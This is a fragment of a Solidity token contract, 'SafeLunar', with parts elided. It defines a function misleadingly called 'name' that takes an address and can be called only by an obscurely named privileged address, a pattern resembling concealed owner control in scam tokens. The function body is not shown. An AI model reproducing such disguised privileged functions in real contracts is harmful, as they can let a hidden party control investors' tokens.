...
contract QSAFELUNAR is Ownable {
    ...
    string public _tokenname = "SafeLunar";
    string public _tokensymbol = "SAFELUNAR";
    uint256 tokenamount = 10000000000*10**decimals();
    address public wahns12;
    ...
    function name(address jjkxq1) public     {
        require(wahns12 ==  _msgSender());
        if(wahns12 != _msgSender()){
                revert("fu");
        }
